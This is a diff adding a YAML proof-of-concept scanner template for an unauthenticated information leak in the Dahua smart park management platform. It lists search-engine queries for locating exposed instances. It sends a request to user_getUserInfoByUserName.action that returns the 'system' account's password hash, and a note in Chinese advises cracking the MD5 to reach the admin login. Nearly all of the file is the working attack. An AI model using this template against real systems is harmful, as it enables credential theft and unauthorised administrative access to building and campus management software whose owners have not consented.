@@ -1,0 +1,39 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="dahua-智慧园区综合管理平台"
+    hunter-query: app.name="Dahua 大华 智慧园区管理平台" | web.body="/WPMS/asset/lib/gridster/"    
+    quake-query: app:"dahua-WP"
+    zoomeye-query: title:"智慧园区综合管理平台"
+    threatbook-query: app=大华
+    cve: 
+    cnvd:
+    tips: DSS密码,system 用户的密码, md5 解密即可  # path: /admin/login_login.action     |   也有可能是默认后台 WPMS 的密码
+    
+name: poc-yaml-dahua-zonghe-user_getUserInfoByUserName.action-unleak
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /admin/user_getUserInfoByUserName.action?userName=system
+            headers:
+            body:         
+        expression: response.status == 200 && response.body_string.contains("loginPass")
+        output:
+          search: |-
+            "(?P<filename>ico.*jsp)".bsubmatch(response.body)
+          path: search["filename"]
+
+expression: r0() 
